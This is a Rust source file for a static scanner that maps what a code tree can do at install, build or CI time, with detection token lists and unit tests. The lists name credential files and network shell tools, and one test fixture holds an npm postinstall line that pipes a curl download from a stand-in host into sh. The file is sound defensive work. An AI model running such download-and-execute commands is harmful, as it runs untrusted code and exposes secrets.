//! Deterministic install-surface ledger.
//!
//! `sift surface` answers a narrower question than the risk ledger: *what can
//! this tree do at install, build, or CI time*, listed as capabilities with
//! `file:line` evidence. It reuses the same dehydrated evidence as
//! `--scan-only`, runs no model, and (unlike the audit path) never reads the
//! target's `.env` or `sift-policy.toml`, so the ledger is a pure function of
//! the tree being inspected.

use std::collections::{BTreeMap, BTreeSet};
use std::io::Write;
use std::process::ExitCode;

use serde::Serialize;

use crate::config::{Config, OutputFormat, SurfaceCli};
use crate::extract::{self, AstSummary, Lang};
use crate::report::{self, PathScope};
use crate::scanner;

/// Capabilities are always emitted in this fixed order so text output, JSON,
/// and diffs stay stable across runs.
pub const CAPABILITIES: [&str; 7] = [
    "artifact", "deps", "execute", "fs-write", "hook", "network", "secret",
];

const LANG_MANIFEST: &str = "manifest";
const LANG_PACKAGE_JSON: &str = "package-json";
const LANG_MAKEFILE: &str = "makefile";
const LANG_MARKDOWN: &str = "markdown";
const LANG_DOCKERFILE: &str = "dockerfile";

/// Triggers describe what makes a capability reachable. `source` and
/// `manifest` mean "present in code or metadata, not proven to run at install
/// time"; every other trigger is an install, build, or CI entry point.
const TRIGGER_SOURCE: &str = "source";
const TRIGGER_MANIFEST: &str = "manifest";
const TRIGGER_DOC: &str = "doc";
const TRIGGER_CI_RUN: &str = "ci-run";
const TRIGGER_CI_USES: &str = "ci-uses";
const TRIGGER_DOCKER_RUN: &str = "docker-run";
const TRIGGER_DOCKER_ENTRY: &str = "docker-entry";
const TRIGGER_MAKE: &str = "make";
const TRIGGER_BUILD_SCRIPT: &str = "build-script";
const TRIGGER_PYTHON_SETUP: &str = "python-setup";
const TRIGGER_INSTALL_SCRIPT: &str = "install-script";

/// One capability observation. `confidence` is `strong` when the line proves
/// the capability, and `weak` when it only indicates reach: an import, a URL
/// literal, an environment read.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SurfaceEntry {
    pub capability: &'static str,
    pub trigger: &'static str,
    pub confidence: &'static str,
    pub evidence: &'static str,
    pub path: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    pub scope: &'static str,
    pub text: String,
}

#[derive(Debug, Default, Serialize)]
pub struct SurfaceCoverage {
    pub candidate_files: usize,
    pub scanned_files: usize,
    pub unsupported_files: usize,
    pub read_failed: usize,
    pub parse_failed: usize,
}

#[derive(Serialize)]
struct SurfaceReport<'a> {
    schema_version: u32,
    root: String,
    entries_total: usize,
    entries_shown: usize,
    truncated: bool,
    counts: BTreeMap<&'static str, usize>,
    hidden_by_scope: &'a BTreeMap<&'static str, usize>,
    coverage: &'a SurfaceCoverage,
    entries: &'a [SurfaceEntry],
}

const SURFACE_SCHEMA_VERSION: u32 = 1;

/// Path scopes the ledger can report. `production` and `ci` are the default
/// because a package's docs and tests describe capabilities that do not run at
/// install time; hidden entries are always counted in the header and JSON.
pub const SCOPES: [&str; 5] = ["production", "ci", "test", "fixture", "docs"];

pub struct ScopeSet {
    all: bool,
    scopes: Vec<String>,
}

impl ScopeSet {
    pub fn includes(&self, scope: &str) -> bool {
        self.all || self.scopes.iter().any(|known| known == scope)
    }
}

pub fn parse_scopes(values: &[String]) -> Result<ScopeSet, String> {
    for value in values {
        if value != "all" && !SCOPES.contains(&value.as_str()) {
            return Err(format!(
                "unknown scope {value:?} (known: all, {})",
                SCOPES.join(", ")
            ));
        }
    }
    Ok(ScopeSet {
        all: values.iter().any(|value| value == "all"),
        scopes: values.to_vec(),
    })
}

/// Counts of entries excluded by the scope filter, so filtering is never silent.
pub fn hidden_scope_counts(
    entries: &[SurfaceEntry],
    scopes: &ScopeSet,
) -> BTreeMap<&'static str, usize> {
    let mut counts = BTreeMap::new();
    for entry in entries {
        if scopes.includes(entry.scope) {
            continue;
        }
        *counts.entry(entry.scope).or_insert(0) += 1;
    }
    counts
}

pub fn run_surface(cli: SurfaceCli) -> ExitCode {
    let max_bytes = cli.max_bytes.unwrap_or(512 * 1024);
    let cfg = match Config::for_reader(cli.target.clone(), cli.module.clone(), max_bytes) {
        Ok(cfg) => cfg,
        Err(e) => {
            eprintln!("surface error: {e}");
            return ExitCode::from(2);
        }
    };
    if let Some(bad) = cli
        .capability
        .iter()
        .chain(cli.fail_on.iter())
        .find(|name| !CAPABILITIES.contains(&name.as_str()))
    {
        eprintln!(
            "surface error: unknown capability {bad:?} (known: {})",
            CAPABILITIES.join(", ")
        );
        return ExitCode::from(2);
    }

    let (all_entries, coverage) = collect(&cfg);
    let scopes = match parse_scopes(&cli.scope) {
        Ok(scopes) => scopes,
        Err(e) => {
            eprintln!("surface error: {e}");
            return ExitCode::from(2);
        }
    };
    let hidden_by_scope = hidden_scope_counts(&all_entries, &scopes);
    let filtered: Vec<SurfaceEntry> = all_entries
        .iter()
        .filter(|entry| scopes.includes(entry.scope))
        .filter(|entry| {
            cli.capability.is_empty() || cli.capability.iter().any(|c| c == entry.capability)
        })
        .cloned()
        .collect();
    let emitted: Vec<SurfaceEntry> = if cli.limit == 0 {
        filtered.clone()
    } else {
        filtered.iter().take(cli.limit).cloned().collect()
    };
    let truncated = emitted.len() < filtered.len();

    if cli.debug {
        eprintln!(
            "debug: surface reads no target .env or sift-policy.toml; counts={:?} hidden={hidden_by_scope:?}",
            counts_of(&filtered)
        );
    }

    let mut out = std::io::stdout().lock();
    let write_failed = match cli.format {
        OutputFormat::Text => write_text(
            &mut out,
            &cfg,
            &filtered,
            &emitted,
            truncated,
            &hidden_by_scope,
        ),
        OutputFormat::Json => write_json(
            &mut out,
            &cfg,
            &coverage,
            &filtered,
            &emitted,
            truncated,
            &hidden_by_scope,
        ),
    }
    .is_err();
    if write_failed {
        // Broken stdout pipes from tools like head are clean exits, not crashes.
        return ExitCode::SUCCESS;
    }

    eprintln!(
        "surface complete: entries={} shown={} candidate_files={} scanned_files={} unsupported_files={} read_failed={} parse_failed={}",
        filtered.len(),
        emitted.len(),
        coverage.candidate_files,
        coverage.scanned_files,
        coverage.unsupported_files,
        coverage.read_failed,
        coverage.parse_failed
    );
    if truncated {
        eprintln!(
            "surface entries truncated: shown {} of {}; raise --limit to see more",
            emitted.len(),
            filtered.len()
        );
    }

    if !cli.fail_on.is_empty()
        && all_entries
            .iter()
            .any(|entry| cli.fail_on.iter().any(|c| c == entry.capability))
    {
        return ExitCode::from(1);
    }
    ExitCode::SUCCESS
}

/// File-shape audit. Token detectors cannot see an obfuscated payload: the
/// code is a string array plus generated identifiers, so no capability token
/// ever appears. Shape is what survives obfuscation, so a long-line or
/// generated-identifier file is reported as an opaque artifact.
///
/// Thresholds are deliberately conservative: `_0x` identifier arrays are an
/// obfuscator signature (minifiers do not emit them), and a 20 000 character
/// line only appears in generated bundles, which are reported as `weak`.
fn audit_shape(path: &str, src: &[u8], out: &mut Vec<SurfaceEntry>) {
    if is_lock_or_manifest_path(path) {
        return;
    }
    let text = String::from_utf8_lossy(src);
    let mut max_line = 0usize;
    let mut lines = 0usize;
    for line in text.lines() {
        lines += 1;
        max_line = max_line.max(line.len());
    }
    let generated = text.matches("_0x").count();
    let (evidence, confidence) = if generated >= 100 {
        ("obfuscated_source", "strong")
    } else if max_line >= 20_000 {
        ("minified_source", "weak")
    } else {
        return;
    };
    out.push(SurfaceEntry {
        capability: "artifact",
        trigger: TRIGGER_SOURCE,
        confidence,
        evidence,
        path: path.to_string(),
        line: None,
        scope: PathScope::classify(path).code(),
        text: format!(
            "bytes={} lines={} max_line={} generated_idents={}",
            src.len(),
            lines,
            max_line,
            generated
        ),
    });
}

fn is_lock_or_manifest_path(path: &str) -> bool {
    let lower = path.replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(lower.as_str());
    matches!(
        name,
        "package-lock.json"
            | "yarn.lock"
            | "pnpm-lock.yaml"
            | "cargo.lock"
            | "poetry.lock"
            | "uv.lock"
            | "pdm.lock"
            | "bun.lockb"
            | "requirements.txt"
    )
}

/// Walk the tree once and turn dehydrated evidence into capability entries.
pub fn collect(cfg: &Config) -> (Vec<SurfaceEntry>, SurfaceCoverage) {
    let rx = scanner::spawn_scan(cfg);
    let mut coverage = SurfaceCoverage::default();
    let mut entries = Vec::new();

    for path in rx {
        coverage.candidate_files += 1;
        let Ok(meta) = std::fs::metadata(&path) else {
            coverage.read_failed += 1;
            continue;
        };
        let rel = path.strip_prefix(&cfg.root).unwrap_or(&path);
        let rel_path = rel.display().to_string();

        if meta.len() > cfg.max_bytes {
            coverage.unsupported_files += 1;
            if let Some(artifact) =
                crate::inspect_suspicious_artifact(&rel_path, meta.len(), &meta, true)
            {
                push_artifact(&mut entries, &rel_path, &artifact);
            }
            continue;
        }
        if extract::Lang::from_path(&path).is_none() {
            coverage.unsupported_files += 1;
            if let Some(artifact) =
                crate::inspect_suspicious_artifact(&rel_path, meta.len(), &meta, false)
            {
                push_artifact(&mut entries, &rel_path, &artifact);
            }
            continue;
        }
        let Ok(src) = std::fs::read(&path) else {
            coverage.read_failed += 1;
            continue;
        };
        let Some(sum) = extract::dehydrate(rel, &src) else {
            coverage.parse_failed += 1;
            continue;
        };
        coverage.scanned_files += 1;
        classify(&sum, &mut entries);
        audit_shape(&rel_path, &src, &mut entries);
    }

    entries.sort_by(|a, b| {
        (
            capability_rank(a.capability),
            &a.path,
            a.line,
            a.evidence,
            &a.text,
        )
            .cmp(&(
                capability_rank(b.capability),
                &b.path,
                b.line,
                b.evidence,
                &b.text,
            ))
    });
    entries.dedup();
    (entries, coverage)
}

fn capability_rank(capability: &str) -> usize {
    CAPABILITIES
        .iter()
        .position(|known| *known == capability)
        .unwrap_or(CAPABILITIES.len())
}

/// Artifact reasons come from `inspect_suspicious_artifact`; the mapping keeps
/// `evidence` a static string without leaking the parsed reason.
fn artifact_evidence(reason: &str) -> &'static str {
    match reason.trim() {
        "large_opaque_file" => "large_opaque_file",
        "binary_or_archive_extension" => "binary_or_archive_extension",
        "executable_in_install_or_release_path" => "executable_in_install_or_release_path",
        "extensionless_or_binary_executable" => "extensionless_or_binary_executable",
        _ => "suspicious_artifact",
    }
}

fn push_artifact(
    entries: &mut Vec<SurfaceEntry>,
    path: &str,
    artifact: &report::SuspiciousArtifact,
) {
    for reason in artifact.reason.split(',').filter(|r| !r.trim().is_empty()) {
        entries.push(SurfaceEntry {
            capability: "artifact",
            trigger: TRIGGER_MANIFEST,
            confidence: "strong",
            evidence: artifact_evidence(reason),
            path: path.to_string(),
            line: None,
            scope: PathScope::classify(path).code(),
            text: format!("{} bytes", artifact.size_bytes),
        });
    }
}

/// Classify one dehydrated file into capability entries.
pub fn classify(sum: &AstSummary, out: &mut Vec<SurfaceEntry>) {
    let scope = PathScope::classify(&sum.path).code();
    let lang = sum.lang.unwrap_or("");
    let mut seen: Vec<SurfaceEntry> = Vec::new();

    for loc in &sum.locations {
        let trigger = trigger_for(&sum.path, lang, loc.kind, &loc.text);
        for (capability, evidence, confidence) in detectors(&sum.path, trigger, loc.kind, &loc.text)
        {
            seen.push(SurfaceEntry {
                capability,
                trigger,
                confidence,
                evidence,
                path: sum.path.clone(),
                line: Some(loc.line),
                scope,
                text: loc.text.clone(),
            });
        }
        if is_entry_point(trigger)
            && let Some(evidence) = hook_evidence(trigger)
        {
            seen.push(SurfaceEntry {
                capability: "hook",
                trigger,
                confidence: "strong",
                evidence,
                path: sum.path.clone(),
                line: Some(loc.line),
                scope,
                text: loc.text.clone(),
            });
        }
    }

    // A build script has no single line to point at, so the file itself is the
    // evidence that a build-time code path exists.
    if sum.path.ends_with("build.rs") {
        seen.push(SurfaceEntry {
            capability: "hook",
            trigger: TRIGGER_BUILD_SCRIPT,
            confidence: "strong",
            evidence: "build-script-present",
            path: sum.path.clone(),
            line: None,
            scope,
            text: String::new(),
        });
    }

    seen.sort_by(|a, b| {
        (a.line, a.capability, a.evidence, &a.text).cmp(&(
            b.line,
            b.capability,
            b.evidence,
            &b.text,
        ))
    });
    seen.dedup();
    out.extend(collapse(seen));
}

/// Collapse duplicate observations of one line: keep the longest text per
/// `(capability, trigger, line, evidence)`, and drop `weak` entries whenever a
/// `strong` entry for the same capability already exists on that line.
fn collapse(seen: Vec<SurfaceEntry>) -> Vec<SurfaceEntry> {
    let mut best: BTreeMap<(&'static str, &'static str, usize, &'static str), SurfaceEntry> =
        BTreeMap::new();
    for entry in seen {
        let key = (
            entry.capability,
            entry.trigger,
            entry.line.unwrap_or(0),
            entry.evidence,
        );
        best.entry(key)
            .and_modify(|kept| {
                if entry.text.chars().count() > kept.text.chars().count() {
                    *kept = entry.clone();
                }
            })
            .or_insert(entry);
    }
    let strong: BTreeSet<(&'static str, usize)> = best
        .values()
        .filter(|entry| entry.confidence == "strong")
        .map(|entry| (entry.capability, entry.line.unwrap_or(0)))
        .collect();
    let mut out: Vec<SurfaceEntry> = best
        .into_values()
        .filter(|entry| {
            entry.confidence == "strong"
                || !strong.contains(&(entry.capability, entry.line.unwrap_or(0)))
        })
        .collect();
    out.sort_by(|a, b| {
        (a.capability, a.line, a.evidence, &a.text).cmp(&(
            b.capability,
            b.line,
            b.evidence,
            &b.text,
        ))
    });
    out
}

/// Trigger describes how a line can run. Anything not listed is plain source or
/// metadata and is reported as `source`/`manifest`.
fn trigger_for(path: &str, lang: &str, kind: &str, text: &str) -> &'static str {
    let lower = text.to_ascii_lowercase();
    let trimmed = lower.trim_start();
    if lang == LANG_MANIFEST {
        return TRIGGER_MANIFEST;
    }
    if lang == LANG_MAKEFILE {
        return TRIGGER_MAKE;
    }
    if lang == LANG_PACKAGE_JSON {
        return npm_lifecycle_key(&lower).unwrap_or(TRIGGER_MANIFEST);
    }
    if lang == LANG_MARKDOWN {
        return TRIGGER_DOC;
    }
    if lang == LANG_DOCKERFILE {
        if trimmed.starts_with("run ") {
            return TRIGGER_DOCKER_RUN;
        }
        if trimmed.starts_with("cmd ") || trimmed.starts_with("entrypoint ") {
            return TRIGGER_DOCKER_ENTRY;
        }
        return TRIGGER_MANIFEST;
    }
    if is_workflow_path(path) {
        if lower.contains("run:") {
            return TRIGGER_CI_RUN;
        }
        if lower.contains("uses:") {
            return TRIGGER_CI_USES;
        }
        return TRIGGER_MANIFEST;
    }
    if path.ends_with("setup.py") {
        if lower.contains("cmdclass") || lower.contains("setup(") || lower.contains("setuptools") {
            return TRIGGER_PYTHON_SETUP;
        }
        return TRIGGER_SOURCE;
    }
    if is_install_script_path(path) {
        return TRIGGER_INSTALL_SCRIPT;
    }
    if kind == "import" {
        return TRIGGER_SOURCE;
    }
    TRIGGER_SOURCE
}

fn is_entry_point(trigger: &str) -> bool {
    matches!(
        trigger,
        TRIGGER_CI_RUN
            | TRIGGER_CI_USES
            | TRIGGER_DOCKER_RUN
            | TRIGGER_DOCKER_ENTRY
            | TRIGGER_MAKE
            | TRIGGER_PYTHON_SETUP
            | TRIGGER_INSTALL_SCRIPT
            | TRIGGER_DOC
    ) || is_npm_lifecycle_trigger(trigger)
}

fn hook_evidence(trigger: &str) -> Option<&'static str> {
    Some(match trigger {
        TRIGGER_CI_RUN => "ci-run-step",
        TRIGGER_CI_USES => "ci-action",
        TRIGGER_DOCKER_RUN => "docker-build-step",
        TRIGGER_DOCKER_ENTRY => "docker-entrypoint",
        TRIGGER_MAKE => "make-step",
        TRIGGER_PYTHON_SETUP => "python-setup-command",
        TRIGGER_INSTALL_SCRIPT => "install-script-line",
        TRIGGER_DOC => "documented-command",
        "preinstall" => "npm-preinstall",
        "install" => "npm-install",
        "postinstall" => "npm-postinstall",
        "prepare" => "npm-prepare",
        "prepack" => "npm-prepack",
        "postpack" => "npm-postpack",
        _ => return None,
    })
}

fn is_npm_lifecycle_trigger(trigger: &str) -> bool {
    matches!(
        trigger,
        "preinstall" | "install" | "postinstall" | "prepare" | "prepack" | "postpack"
    )
}

fn npm_lifecycle_key(lower: &str) -> Option<&'static str> {
    for key in [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "prepack",
        "postpack",
    ] {
        if lower.contains(&format!("\"{key}\"")) && lower.contains(':') {
            return Some(match key {
                "preinstall" => "preinstall",
                "install" => "install",
                "postinstall" => "postinstall",
                "prepare" => "prepare",
                "prepack" => "prepack",
                _ => "postpack",
            });
        }
    }
    None
}

fn is_workflow_path(path: &str) -> bool {
    let lower = path.replace('\\', "/").to_ascii_lowercase();
    lower.contains(".github/workflows/")
}

fn is_install_script_path(path: &str) -> bool {
    let lower = path.replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(lower.as_str());
    name == "install.sh"
        || name == "bootstrap.sh"
        || name == "setup.sh"
        || lower.starts_with("scripts/")
        || lower.contains("/scripts/")
}

/// Capability detectors for one evidence line. `trigger` gates the dependency
/// detectors so that a URL inside an install hook is not mistaken for a
/// dependency declaration.
///
/// AST-derived locations carry the callee expression only (for example
/// `https.request` or `fs.readFileSync`), while line-based dehydrators
/// (package.json, lockfiles, Makefiles, Markdown, shell) carry the full line.
/// The token lists below therefore cover both callee names and shell text.
fn detectors(
    path: &str,
    trigger: &str,
    kind: &str,
    text: &str,
) -> Vec<(&'static str, &'static str, &'static str)> {
    let lower = text.to_ascii_lowercase();
    let mut hits = Vec::new();

    if kind == "import" {
        for (tokens, capability, evidence) in IMPORT_CAPABILITIES {
            if tokens.iter().any(|token| has_token(&lower, token)) {
                hits.push((*capability, *evidence, "weak"));
            }
        }
        hits.sort_by(|a, b| (a.0, a.1).cmp(&(b.0, b.1)));
        hits.dedup();
        return hits;
    }

    if report::looks_like_download_execute(text) {
        hits.push(("execute", "download-execute", "strong"));
        hits.push(("network", "remote-fetch", "strong"));
    }
    if report::looks_like_base64_execute(text) {
        hits.push(("execute", "base64-execute", "strong"));
    }
    if report::looks_like_home_or_ssh_write(text) {
        hits.push(("fs-write", "home-or-ssh-write", "strong"));
    }
    // Dynamic eval counts only when `eval` is a real callee; identifiers such
    // as `__detectEval()` are not shell evaluation.
    if (has_token(&lower, "eval") && lower.contains("eval("))
        || contains_any(&lower, &["bash -c", "sh -c"])
    {
        hits.push(("execute", "dynamic-eval", "strong"));
    }
    if contains_any(&lower, &["| sh", "|sh", "| bash", "|bash"]) {
        hits.push(("execute", "pipe-to-shell", "strong"));
    }
    if contains_any(&lower, &["bash -c", "sh -c", "/bin/sh", "/bin/bash"]) {
        hits.push(("execute", "shell-invocation", "strong"));
    }
    if has_token(&lower, "chmod") && contains_any(&lower, &["+x", "755", "777", "u+x", "a+x"]) {
        hits.push(("execute", "chmod-exec", "strong"));
    }
    if contains_any(&lower, PROCESS_SPAWN_TOKENS)
        || calls_named(&lower, "system")
        || calls_named(&lower, "popen")
    {
        hits.push(("execute", "process-spawn", "strong"));
    }

    let fetches = FETCH_TOOLS.iter().any(|token| has_token(&lower, token));
    if fetches {
        hits.push(("network", "remote-fetch", "strong"));
    }
    if PACKAGE_MANAGER_TOKENS
        .iter()
        .any(|token| lower.contains(token))
    {
        hits.push(("network", "package-manager", "weak"));
    }
    // A URL only proves network reach when the line is code, a command, or a
    // dependency spec. Package metadata (homepage, repository, funding) is not
    // an install-time capability, so it is excluded here.
    let url_context = trigger != TRIGGER_MANIFEST || is_dependency_value(path, &lower);
    if !fetches
        && url_context
        && contains_any(
            &lower,
            &["http://", "https://", "ftp://", "git://", "ssh://"],
        )
    {
        hits.push(("network", "remote-url", "weak"));
    }

    if contains_any(
        &lower,
        &[
            "writefile",
            "writefilesync",
            "appendfilesync",
            "fs::write",
            "write_text",
            "shutil.copy",
            "shutil.move",
            "os.remove",
            "os.rename",
            "rm -rf",
            "sed -i",
            "install -m",
            "cat >",
            "tee ",
        ],
    ) {
        hits.push(("fs-write", "file-write-op", "strong"));
    }
    if (lower.contains('>'))
        && (lower.contains(" /") || lower.contains(" ~/") || lower.contains("$home"))
    {
        hits.push(("fs-write", "redirect-to-path", "weak"));
    }

    if contains_any(
        &lower,
        &[
            "process.env",
            "os.environ",
            "getenv",
            "std::env::var",
            "env::var",
            "$env:",
        ],
    ) {
        hits.push(("secret", "env-access", "weak"));
    }
    if contains_any(
        &lower,
        &[
            ".npmrc",
            ".aws/credentials",
            ".aws/config",
            "id_rsa",
            ".netrc",
            ".pypirc",
            ".docker/config.json",
            ".git-credentials",
        ],
    ) {
        hits.push(("secret", "credential-file", "strong"));
    }
    if lower.contains("secrets.") || lower.contains("secrets[") {
        hits.push(("secret", "ci-secret", "strong"));
    }

    if is_dependency_path(path) && trigger == TRIGGER_MANIFEST && !is_metadata_key(&lower) {
        let value = dependency_value(&lower);
        if DEP_SOURCE_TOKENS.iter().any(|token| value.contains(token)) {
            hits.push(("deps", "remote-dep-source", "strong"));
        }
        if contains_any(
            value,
            &[
                "file:",
                "link:",
                "path = \"..",
                "path=\"..",
                "-e .",
                "--editable",
            ],
        ) {
            hits.push(("deps", "local-path-dep", "strong"));
        }
    }

    hits.sort_by(|a, b| (a.0, a.1).cmp(&(b.0, b.1)));
    hits.dedup();
    hits
}

/// Shell/process entry points, covering both full-line shell text and the
/// callee-only text that AST languages produce.
const PROCESS_SPAWN_TOKENS: &[&str] = &[
    "subprocess.",
    "os.system",
    "os.popen",
    "child_process",
    "execsync",
    "execfile",
    "spawnsync",
    "processbuilder",
    "runtime.getruntime",
    "command::new",
    "std::process::command",
    "tokio::process",
];

const FETCH_TOOLS: &[&str] = &[
    "curl",
    "wget",
    "invoke-webrequest",
    "invoke-restmethod",
    "ncat",
    "scp",
    "sftp",
    "rsync",
    "requests.get",
    "requests.post",
    "urllib",
    "http.client",
    "https.request",
    "http.request",
    "urlopen",
    "net.connect",
    "httpx",
    "axios",
    "node-fetch",
    "got(",
    "fetch(",
];

const PACKAGE_MANAGER_TOKENS: &[&str] = &[
    "npm install",
    "npm i ",
    "npm ci",
    "yarn add",
    "pnpm add",
    "pip install",
    "pip3 install",
    "python -m pip",
    "cargo install",
    "go get ",
    "gem install",
    "docker pull",
    "apt-get install",
    "brew install",
];

const IMPORT_CAPABILITIES: &[(&[&str], &str, &str)] = &[
    (
        &[
            "subprocess",
            "child_process",
            "std::process",
            "tokio::process",
        ],
        "execute",
        "capability-import",
    ),
    (
        &[
            "requests", "urllib", "httpx", "aiohttp", "socket", "reqwest", "hyper", "net/http",
        ],
        "network",
        "capability-import",
    ),
    (
        &["shutil", "fs/promises", "tempfile"],
        "fs-write",
        "capability-import",
    ),
    (&["dotenv", "keyring"], "secret", "capability-import"),
];

fn is_dependency_path(path: &str) -> bool {
    let lower = path.replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(lower.as_str());
    matches!(
        name,
        "package.json"
            | "cargo.toml"
            | "requirements.txt"
            | "pyproject.toml"
            | "package-lock.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "poetry.lock"
            | "gemfile"
            | "build.gradle"
            | "pom.xml"
    ) || lang_is_manifest(path)
}

fn lang_is_manifest(path: &str) -> bool {
    extract::Lang::from_path(std::path::Path::new(path)) == Some(Lang::Manifest)
}

fn contains_any(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| haystack.contains(needle))
}

/// Package metadata URLs (`homepage`, `repository`, ...) are not dependency
/// sources; without this guard every package.json with a github homepage is
/// reported as a remote dependency.
fn is_metadata_key(lower: &str) -> bool {
    const METADATA_KEYS: [&str; 24] = [
        "homepage",
        "repository",
        "bugs",
        "funding",
        "author",
        "contributors",
        "maintainers",
        "license",
        "description",
        "keywords",
        "readme",
        "unpkg",
        "jsdelivr",
        "main",
        "module",
        "types",
        "typings",
        "engines",
        "url",
        "demo",
        "download",
        "email",
        "sponsor",
        "publishconfig",
    ];
    METADATA_KEYS
        .iter()
        .any(|key| lower.contains(&format!("\"{key}\"")) && lower.contains(&format!("\"{key}\": ")))
}

/// Non-registry dependency sources. They must appear in the *value* half of a
/// declaration, never in package metadata.
const DEP_SOURCE_TOKENS: &[&str] = &[
    "git+",
    "git://",
    "github:",
    "gitlab:",
    "bitbucket:",
    "ssh://",
    ".git\"",
    ".git,",
    ".git }",
    ".tgz",
    ".tar.gz",
    "file:",
    "link:",
    " @ http",
];

/// The value half of `"key": "value"` (or of a requirements/Cargo line), which
/// is where a dependency source lives.
fn dependency_value(lower: &str) -> &str {
    match lower.find("\": ") {
        Some(idx) => &lower[idx + 3..],
        None => match lower.find(" = ") {
            Some(idx) => &lower[idx + 2..],
            None => lower,
        },
    }
}

fn is_dependency_value(path: &str, lower: &str) -> bool {
    is_dependency_path(path)
        && DEP_SOURCE_TOKENS
            .iter()
            .any(|t| dependency_value(lower).contains(t))
}

/// Token match with identifier boundaries, so `shell_escape` is not `sh` and
/// `preinstall_hook` is not `install`.
fn has_token(haystack: &str, token: &str) -> bool {
    let bytes = haystack.as_bytes();
    let mut start = 0;
    while let Some(pos) = haystack[start..].find(token) {
        let begin = start + pos;
        let end = begin + token.len();
        let before_ok = begin == 0 || !is_word_byte(bytes[begin - 1]);
        let after_ok = end >= haystack.len() || !is_word_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
        start = begin + 1;
        if start >= haystack.len() {
            break;
        }
    }
    false
}

fn is_word_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// True when `name` is *called* (`system(`), not when it appears in a longer
/// identifier (`detect_subsystem(`) or in a definition (`def system(self)`).
fn calls_named(lower: &str, name: &str) -> bool {
    let needle = format!("{name}(");
    let mut start = 0;
    while let Some(pos) = lower[start..].find(&needle) {
        let begin = start + pos;
        let before = &lower[..begin];
        let prev_ok = before
            .chars()
            .next_back()
            .map(|c| !c.is_alphanumeric() && c != '_')
            .unwrap_or(true);
        let trimmed = before.trim_end();
        let is_definition = ["def", "fn", "function", "func", "class"]
            .iter()
            .any(|keyword| trimmed.ends_with(keyword));
        if prev_ok && !is_definition {
            return true;
        }
        start = begin + 1;
        if start >= lower.len() {
            break;
        }
    }
    false
}

fn counts_of(entries: &[SurfaceEntry]) -> BTreeMap<&'static str, usize> {
    let mut counts = BTreeMap::new();
    for capability in CAPABILITIES {
        let n = entries
            .iter()
            .filter(|entry| entry.capability == capability)
            .count();
        if n > 0 {
            counts.insert(capability, n);
        }
    }
    counts
}

fn write_text(
    out: &mut impl Write,
    cfg: &Config,
    filtered: &[SurfaceEntry],
    emitted: &[SurfaceEntry],
    truncated: bool,
    hidden_by_scope: &BTreeMap<&'static str, usize>,
) -> std::io::Result<()> {
    writeln!(out, "INSTALL_SURFACE: {}", cfg.root.display())?;
    let counts = counts_of(filtered);
    let summary: Vec<String> = counts
        .iter()
        .map(|(capability, n)| format!("{capability}={n}"))
        .collect();
    writeln!(
        out,
        "- entries: {} shown: {} ({})",
        filtered.len(),
        emitted.len(),
        if summary.is_empty() {
            "none".to_string()
        } else {
            summary.join(" ")
        }
    )?;
    if !hidden_by_scope.is_empty() {
        let hidden: Vec<String> = hidden_by_scope
            .iter()
            .map(|(scope, n)| format!("{scope}={n}"))
            .collect();
        writeln!(
            out,
            "- hidden_by_scope: {} (use --scope all to include)",
            hidden.join(" ")
        )?;
    }
    if truncated {
        writeln!(out, "- truncated: true")?;
    }
    for capability in CAPABILITIES {
        let group: Vec<&SurfaceEntry> = emitted
            .iter()
            .filter(|entry| entry.capability == capability)
            .collect();
        if group.is_empty() {
            continue;
        }
        writeln!(out, "\n== {capability} ({}) ==", group.len())?;
        for entry in group {
            match entry.line {
                Some(line) => writeln!(
                    out,
                    "{}:{}: {} {} {} {}: {}",
                    entry.path,
                    line,
                    entry.confidence,
                    entry.trigger,
                    entry.evidence,
                    entry.scope,
                    entry.text
                )?,
                None => writeln!(
                    out,
                    "{}:-: {} {} {} {}: {}",
                    entry.path,
                    entry.confidence,
                    entry.trigger,
                    entry.evidence,
                    entry.scope,
                    entry.text
                )?,
            }
        }
    }
    Ok(())
}

fn write_json(
    out: &mut impl Write,
    cfg: &Config,
    coverage: &SurfaceCoverage,
    filtered: &[SurfaceEntry],
    emitted: &[SurfaceEntry],
    truncated: bool,
    hidden_by_scope: &BTreeMap<&'static str, usize>,
) -> std::io::Result<()> {
    let report = SurfaceReport {
        schema_version: SURFACE_SCHEMA_VERSION,
        root: cfg.root.display().to_string(),
        entries_total: filtered.len(),
        entries_shown: emitted.len(),
        truncated,
        counts: counts_of(filtered),
        hidden_by_scope,
        coverage,
        entries: emitted,
    };
    let json = serde_json::to_string_pretty(&report).unwrap_or_else(|_| "{}".to_string());
    writeln!(out, "{json}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extract::AstLocation;

    fn summary(
        path: &str,
        lang: &'static str,
        locations: Vec<(&'static str, usize, &str)>,
    ) -> AstSummary {
        AstSummary {
            path: path.to_string(),
            lang: Some(lang),
            locations: locations
                .into_iter()
                .map(|(kind, line, text)| AstLocation {
                    kind,
                    line,
                    text: text.to_string(),
                })
                .collect(),
            ..Default::default()
        }
    }

    fn caps(entries: &[SurfaceEntry]) -> Vec<(&str, &str, &str)> {
        entries
            .iter()
            .map(|entry| (entry.capability, entry.trigger, entry.evidence))
            .collect()
    }

    #[test]
    fn npm_postinstall_download_is_hook_network_execute() {
        let sum = summary(
            "package.json",
            LANG_PACKAGE_JSON,
            vec![(
                "call",
                5,
                "\"postinstall\": \"curl https://x.invalid/a.sh | sh\",",
            )],
        );
        let mut entries = Vec::new();
        classify(&sum, &mut entries);
        let found = caps(&entries);
        assert!(
            found.contains(&("hook", "postinstall", "npm-postinstall")),
            "{found:?}"
        );
        assert!(
            found.contains(&("network", "postinstall", "remote-fetch")),
            "{found:?}"
        );
        assert!(
            found.contains(&("execute", "postinstall", "download-execute")),
            "{found:?}"
        );
    }

    #[test]
    fn identifier_substrings_do_not_trigger_tokens() {
        assert!(!has_token("fn shell_escape(arg: &str)", "sh"));
        assert!(!has_token("fn preinstall_hook()", "install"));
